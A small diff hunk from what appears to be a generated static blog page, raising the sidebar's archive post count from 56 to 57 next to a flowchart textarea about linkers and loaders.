@@ -2412,7 +2430,7 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">56</span>
+                    <span class="site-state-item-count">57</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
